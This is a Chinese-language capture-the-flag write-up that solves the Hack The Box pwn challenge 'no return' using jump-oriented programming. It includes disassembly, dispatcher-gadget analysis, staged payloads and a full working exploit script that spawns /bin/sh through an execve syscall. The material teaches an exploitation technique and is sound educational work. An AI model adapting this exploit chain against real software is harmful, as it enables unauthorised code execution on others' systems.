# JOP 利用思想和 JOP 链构造分析全过程，以一个题目为例-先知社区

> **来源**: https://xz.aliyun.com/news/17081  
> **文章ID**: 17081

---

## 前言

题目来自 Hack the Box 困难难度的 pwn 题目：no return，是栈溢出题目，但是真的没有可用的ret指令，gadget反而以jmp结尾居多，很容易想到曾经见过的一个名词：JOP

本文以该题目为例，分享JOP的思想和构造JOP链的过程，本题构造方法不唯一，以其中一种方式为例

> 参考资料[4]为非预期解，通过构造SROP配合jmp完成RCE，并非本文主题，有兴趣可以去看看

## 题目情况

A hop, skip, and a jump to the flag.

```
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

## 逆向分析

start：

```
.text:000000000040106D                 public start
.text:000000000040106D start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:000000000040106D
.text:000000000040106D var_8           = qword ptr -8
.text:000000000040106D
.text:000000000040106D                 push    rsp
.text:000000000040106E                 xor     rax, rax
.text:0000000000401071                 inc     rax
.text:0000000000401074                 xor     rdi, rdi
.text:0000000000401077                 inc     rdi             ; fd
.text:000000000040107A                 mov     rsi, rsp        ; buf
.text:000000000040107D                 mov     edx, 8          ; count
.text:0000000000401082                 syscall                 ; LINUX - sys_write
.text:0000000000401084                 sub     rsi, 0B0h
.text:000000000040108B                 xor     rax, rax
.text:000000000040108E                 xor     rdi, rdi        ; fd
.text:0000000000401091                 lea     rsi, [rsi]      ; buf
.text:0000000000401094                 mov     edx, 0C0h       ; count
.text:0000000000401099                 syscall                 ; LINUX - sys_read
.text:000000000040109B                 add     rsp, 8
.text:000000000040109F                 jmp     [rsp+var_8]
.text:000000000040109F start           endp
```

给了个地址泄露，位于rsp的值

还有一些其他的代码：

```
.text:0000000000401000 ; Segment type: Pure code
.text:0000000000401000 ; Segment permissions: Read/Execute
.text:0000000000401000 _text           segment para public 'CODE' use64
.text:0000000000401000                 assume cs:_text
.text:0000000000401000                 ;org 401000h
.text:0000000000401000                 assume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing
.text:0000000000401000
.text:0000000000401000 loc_401000:                             ; DATA XREF: LOAD:0000000000400088↑o
.text:0000000000401000                 pop     rsp
.text:0000000000401001                 pop     rdi
.text:0000000000401002                 pop     rsi
.text:0000000000401003                 pop     rbp
.text:0000000000401004                 pop     rdx
.text:0000000000401005                 pop     rcx
.text:0000000000401006                 pop     rbx
.text:0000000000401007                 xor     rax, rax
.text:000000000040100A                 jmp     qword ptr [rdi+1]
.text:000000000040100D ; ---------------------------------------------------------------------------
.text:000000000040100D                 inc     rax
.text:0000000000401010                 fdivrp  st(1), st
.text:0000000000401012                 jmp     qword ptr [rdx]
.text:0000000000401014 ; ---------------------------------------------------------------------------
.text:0000000000401014                 sub     rsi, [rsp+10h]
.text:0000000000401019                 cmc
.text:000000000040101A                 jmp     qword ptr [rdx]
.text:000000000040101C ; ---------------------------------------------------------------------------
.text:000000000040101C                 mov     rcx, rsp
.text:000000000040101F                 std
.text:0000000000401020                 jmp     qword ptr [rdx]
.text:0000000000401022 ; ---------------------------------------------------------------------------
.text:0000000000401022                 lea     rcx, [rcx+rbx*8]
.text:0000000000401026                 std
.text:0000000000401027                 jmp     qword ptr [rcx]
.text:0000000000401029 ; ---------------------------------------------------------------------------
.text:0000000000401029                 xor     rbp, rdx
.text:000000000040102C                 setnz   ah
.text:000000000040102F                 jmp     qword ptr [rbp-17BC0000h]
.text:0000000000401035 ; ---------------------------------------------------------------------------
.text:0000000000401035                 add     rsp, rsi
.text:0000000000401038                 fdivp   st(1), st
.text:000000000040103A                 jmp     qword ptr [rdx]
.text:000000000040103C ; ---------------------------------------------------------------------------
.text:000000000040103C                 add     rbp, rbx
.text:000000000040103F                 wait
.text:0000000000401040                 jmp     qword ptr [rbp-39h]
.text:0000000000401043 ; ---------------------------------------------------------------------------
.text:0000000000401043                 mov     [rdi-17BC0000h], ah
.text:0000000000401049                 stc
.text:000000000040104A                 jmp     qword ptr [rdx]
.text:000000000040104C ; ---------------------------------------------------------------------------
.text:000000000040104C                 pop     rcx
.text:000000000040104D                 mov     rcx, rdx
.text:0000000000401050                 pop     rdx
.text:0000000000401051                 jmp     qword ptr [rcx]
.text:0000000000401053 ; ---------------------------------------------------------------------------
.text:0000000000401053                 inc     rcx
.text:0000000000401056                 fdivrp  st(1), st
.text:0000000000401058                 jmp     qword ptr [rdx]
.text:000000000040105A ; ---------------------------------------------------------------------------
.text:000000000040105A                 xchg    rax, rdx
.text:000000000040105C                 fdivp   st(1), st
.text:000000000040105E                 jmp     qword ptr [rcx]
.text:0000000000401060 ; ---------------------------------------------------------------------------
.text:0000000000401060                 inc     rbx
.text:0000000000401063                 fdivrp  st(1), st
.text:0000000000401065                 jmp     qword ptr [rdx]
.text:0000000000401067 ; ---------------------------------------------------------------------------
.text:0000000000401067                 xchg    rcx, rdi
.text:000000000040106A                 std
.text:000000000040106B                 jmp     qword ptr [rdx]
.text:000000000040106D
```

## 利用分析

### 利用思路分析

程序情况分析：

* 程序是栈溢出，但是没有ret退出，而是jmp的方式跳转到栈上的返回地址
* 给了栈地址，意味着缓冲区地址可知
* 没有PIE，意味着可以任意跳转到其他的片段，可以通过控制寄存器的值来控制跳转

那么思路就是，想办法凑出参数执行execve的syscall

目标就是：

* rax = 0x3b
* rdi = 指向`/bin/sh`的指针
* rsi = 0
* rdx = 0
* 最后调用syscall

而程序中提供的gadget，全都是以jmp结尾的跳转而非ret，这里是JOP的技法！

> 在各种资料里介绍ROP的时候，都会顺带一提，还有JOP，通过jmp指令完成跳转

### ROP 和 JOP

![image.png](images/5b84d265-3ed3-3ab0-b435-08741d7ddd8e)

**ROP**和**JOP**二者结构如上图（参考资料[3]）

**ROP**依赖**返回指令（ret）** 链式调用gadget。攻击者通过覆盖栈上的返回地址，使程序依次执行多个以`ret`结尾的代码片段。通过栈溢出控制连续的返回地址，形成“链式”执行流程。例如，通过`pop`指令设置寄存器参数，再调用系统函数，构造的栈本身就是个夹杂数据的跳转表

**JOP**利用**间接跳转指令（jmp）** 链接gadget。攻击者篡改寄存器或内存中的跳转目标地址，构造非连续的代码执行链。依赖间接跳转指令的灵活性，可能通过“调度器gadget”动态选择后续执行的代码片段，攻击链更复杂且非线性。

构造JOP链路需要找到一组分发器-分发表组合，通过分发器选择分发表，跳转到指定的以jmp返回的gadget中，然后jmp回分发器，再次进入分发表跳转到下一个gadget。

### 找到 JOP 分发器 gadget

一个比较理想的情况是，有一组寄存器在后续gadget中不会被影响，分发器选择分发表中的地址时，通过同一组gadget进行

程序中给出的gadget大多以`jmp [rcx]`和`jmp [rdx]`结尾，这两个寄存器的变化应该会很频繁，不适合用作分发器gadget

排除掉这俩以后，还剩如下gadget：

```
.text:0000000000401029                 xor     rbp, rdx
.text:000000000040102C                 setnz   ah
.text:000000000040102F                 jmp     qword ptr [rbp-17BC0000h]

.text:000000000040103C                 add     rbp, rbx
.text:000000000040103F                 wait
.text:0000000000401040                 jmp     qword ptr [rbp-39h]
```

只剩下2个，初始状态，rbp，rbx，rdx的值都是可控的，因为rdx的值会经常变化，所以只剩下1个满足要求的gadget

让`rbp-0x39`指向内存中可控区域（分发表），让`rbx=8`，即可每次跳转到该gadget的时候，执行分发表中的下一个gadget

### 构造 JOP 链 - 初始形态

此时 payload 的初始形态已经构成：

```
payload = flat({
    0x00:pack(0x40103c),            # jmp table
  
    0x08:pack(buf-1),               # rdi
    0x10:pack(0),                   # rsi
    0x18:pack(buf+0x80+0x39-8),     # rbp
    0x20:pack(0),                 	# rdx
    0x28:pack(0),            		# rcx
    0x30:pack(8),                   # rbx
  
    # chains
    0x80:pack(0xdeadbeef),

    0xb0:pack(0x401000),            # overwrite return address
    0xb8:pack(buf+0x8)              # set rsp = buf + 8
},filler = "\x00",length=0xc0)
```

可控区域总共0xc0大小，其中0xb0位置是栈溢出控制的返回地址所在，设置为初始化寄存器的跳转gadget那里：

```
.text:0000000000401000                 pop     rsp
.text:0000000000401001                 pop     rdi
.text:0000000000401002                 pop     rsi
.text:0000000000401003                 pop     rbp
.text:0000000000401004                 pop     rdx
.text:0000000000401005                 pop     rcx
.text:0000000000401006                 pop     rbx
.text:0000000000401007                 xor     rax, rax
.text:000000000040100A                 jmp     qword ptr [rdi+1]
```

其中0xb8是新的rsp，然后依次设置了其他寄存器，通过`jmp qword ptr [rdi+1]`跳转到分发器，分发器跳转到分发表（0x80处开始）

### 构造 JOP 链 - 分析寄存器赋值

目标要处理的寄存器是：

* rax = 0x3b
* rdi = 指向`/bin/sh`的指针
* rsi = 0
* rdx = 0

可控rdi的gadget只有一个：通过rcx来赋值，然后跳转到rdx，需要rcx和rdx可控，rcx执行字符串地址，rdx指向分发器

```
.text:0000000000401067                 xchg    rcx, rdi
.text:000000000040106A                 std
.text:000000000040106B                 jmp     qword ptr [rdx]
```

rcx的值需要是指针，这里还有一个gadget能完成：

```
.text:000000000040101C                 mov     rcx, rsp
.text:000000000040101F                 std
.text:0000000000401020                 jmp     qword ptr [rdx]
```

可控rax的gadget也只有一个：通过rdx赋值，跳转到rcx，需要rdx和rcx可控，rdx=0x3b，rcx指向分发器（因为初始rax=0，意味着后续在执行到这之前，rax始终是0，所以同时这里还能满足最后要rdx=0的条件

```
.text:000000000040105A                 xchg    rax, rdx
.text:000000000040105C                 fdivp   st(1), st
.text:000000000040105E                 jmp     qword ptr [rcx]
```

对于rsi，可以在初始化阶段完成赋值，且后续可能不会用到

对于rdx，除了rax那个之外，也只有一个gadget，通过栈将值pop给rdx，然后跳转到rcx

```
.text:000000000040104C                 pop     rcx
.text:000000000040104D                 mov     rcx, rdx
.text:0000000000401050                 pop     rdx
.text:0000000000401051                 jmp     qword ptr [rcx]
```

### 构造 JOP 链

rdx和rcx都是初始可控的，可以手动指向分发器

根据刚刚找出的gadget分析，最难搞的是让rcx指向字符串地址，但是也有gadget可以完成赋值，所以先凑rax还是rdi都行，这里以先rdi为例进行构造

所以第一步，先完成rdi指向字符串的目标

```
payload = flat({
    0x00:pack(0x40103c),            # jmp table
  
    0x08:pack(buf-1),               # rdi
    0x10:pack(0),                   # rsi
    0x18:pack(buf+0x80+0x39-8),     # rbp
    0x20:pack(buf),                 # rdx
    0x28:pack(buf+0xa8),            # rcx
    0x30:pack(8),                   # rbx
  
    # chains
    0x80:pack(0x401067),            # jmptable #1 : set rdi="/bin/sh\x00"

    0xa8:b"/bin/sh\x00",
    0xb0:pack(0x401000),            # overwrite return address
    0xb8:pack(buf+0x8)              # set rsp = buf + 8
},filler = "\x00",length=0xc0)
```

这里设置rcx指向字符串地址，rdx指向分发表，完成第一次跳转：

```
.text:0000000000401067                 xchg    rcx, rdi
.text:000000000040106A                 std
.text:000000000040106B                 jmp     qword ptr [rdx]
```

结束之后，rcx是不可用的数据，准备进入下一次跳转

第二步，设置rdx，这里的gadget可以修复变得不可用的rcx的值：

```
.text:000000000040104D                 mov     rcx, rdx
.text:0000000000401050                 pop     rdx
.text:0000000000401051                 jmp     qword ptr [rcx]
```

通过栈提供rdx需要的值（0x3b），后续赋值rax使用

此时的payload：

```
payload = flat({
    0x00:pack(0x40103c),            # jmp table
  
    0x08:pack(buf-1),               # rdi
    0x10:pack(0),                   # rsi
    0x18:pack(buf+0x80+0x39-8),     # rbp
    0x20:pack(buf),                 # rdx
    0x28:pack(buf+0xa8),            # rcx
    0x30:pack(8),                   # rbx
  
    0x38:pack(0x3b),  

    # chains
    0x80:pack(0x401067),            # jmptable #1 : set rdi="/bin/sh\x00"
    0x88:pack(0x40104d),            # jmptable #2 : set rdx = 0x3b

    0xa8:b"/bin/sh\x00",
    0xb0:pack(0x401000),            # overwrite return address
    0xb8:pack(buf+0x8)              # set rsp = buf + 8
},filler = "\x00",length=0xc0)
```

此时rsi=0，rdx=0x3b，rdi=sh字符串地址，rax=0

去完成rax的设置：

```
.text:000000000040105A                 xchg    rax, rdx
.text:000000000040105C                 fdivp   st(1), st
.text:000000000040105E                 jmp     qword ptr [rcx]
```

最后rcx依然指向分发器：

```
payload = flat({
    0x00:pack(0x40103c),            # jmp table
  
    0x08:pack(buf-1),               # rdi
    0x10:pack(0),                   # rsi
    0x18:pack(buf+0x80+0x39-8),     # rbp
    0x20:pack(buf),                 # rdx
    0x28:pack(buf+0xa8),            # rcx
    0x30:pack(8),                   # rbx
  
    0x38:pack(0x3b),  

    # chains
    0x80:pack(0x401067),            # jmptable #1 : set rdi="/bin/sh\x00"
    0x88:pack(0x40104d),            # jmptable #2 : set rdx = 0x3b
    0x90:pack(0x40105a),            # jmptable #3 : set rax = 0x3b , rdx=0

    0xa8:b"/bin/sh\x00",
    0xb0:pack(0x401000),            # overwrite return address
    0xb8:pack(buf+0x8)              # set rsp = buf + 8
},filler = "\x00",length=0xc0)
```

此时参数已经凑齐了，下一次跳转依然从分发表中取值，只需要指向syscall的地址即可

## 完整exp

```
#!/usr/bin/env python3

from pwncli import *
cli_script()

context.arch="amd64"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


# leak stack address
leak = r(8)
leak = unpack(leak)
success(f"leak: {hex(leak)}")

buf = leak - 0xb8
success(f"buf: {hex(buf)}")

payload = flat({
    0x00:pack(0x40103c),            # jmp table
  
    0x08:pack(buf-1),               # rdi
    0x10:pack(0),                   # rsi
    0x18:pack(buf+0x80+0x39-8),     # rbp
    0x20:pack(buf),                 # rdx
    0x28:pack(buf+0xa8),            # rcx
    0x30:pack(8),                   # rbx
  
    0x38:pack(0x3b),  

    # chains
    0x80:pack(0x401067),            # jmptable #1 : set rdi="/bin/sh\x00"
    0x88:pack(0x40104d),            # jmptable #2 : set rdx = 0x3b
    0x90:pack(0x40105a),            # jmptable #3 : set rax = 0x3b , rdx=0
    0x98:pack(0x401099),            # jmptable #4 : syscall

    0xa8:b"/bin/sh\x00",
    0xb0:pack(0x401000),            # overwrite return address
    0xb8:pack(buf+0x8)              # set rsp = buf + 8
},filler = "\x00",length=0xc0)

s(payload)

ia()
```

## 总结

JOP链构造的思路：

1. 找分发器和分发表
2. 找到可能要用的gadget（例如我需要对某个寄存器赋值，找到相关gadget）
3. 分析可能要用到的gadget，在分发器结构不变的情况下，串联gadget

## 参考资料

* [1] [Hack-The-Box-pwn-challenge[no-return] | 0xfd&apos;s blog](https://fdlucifer.github.io/2021/01/05/noreturn/)
* [2] [Will&apos;s Root: Jump Oriented Programming and Call Oriented Programming (JOP and PCOP)](https://www.willsroot.io/2019/09/jump-oriented-programming-and-call.html)
* [3] [asiaccs11.pdf](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)
* [4] [No Return | 7Rocky](https://7rocky.github.io/en/ctf/htb-challenges/pwn/no-return/)
